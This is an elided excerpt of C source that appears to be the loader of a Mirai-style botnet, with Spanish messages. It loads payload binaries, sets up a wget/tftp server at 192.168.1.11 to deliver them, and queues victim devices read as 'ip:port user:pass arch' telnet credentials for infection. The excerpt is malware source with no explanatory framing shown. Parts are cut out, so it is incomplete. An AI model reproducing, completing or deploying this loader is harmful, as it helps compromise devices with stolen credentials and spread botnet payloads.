...
int main(int argc, char **args)
{
    ...
    if (!binary_init())
    {
        printf("Fallo al cargar bins/dlr.*\n");
        return 1;
    }

    /*                                                                                   wget address           tftp address */
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "192.168.1.11", 80, "192.168.1.11")) == NULL)
    {
        printf("Fallo en la inicialización del servidor. Abortando\n");
        return 1;
    }
    ...
    while (TRUE)
    {
        ...
        if (telnet_info_parse(strbuf, &info) == NULL)
            printf("Error en el parseo telnet info: \"%s\" Formato -> ip:port user:pass arch\n", strbuf);
        else
        {
            if (srv == NULL)
                printf("srv == NULL 2\n");
            ...
            if (total++ % 1000 == 0)
                sleep(1);
            printf("Objetivo %s agregado a la cola.\n", strbuf);
        }
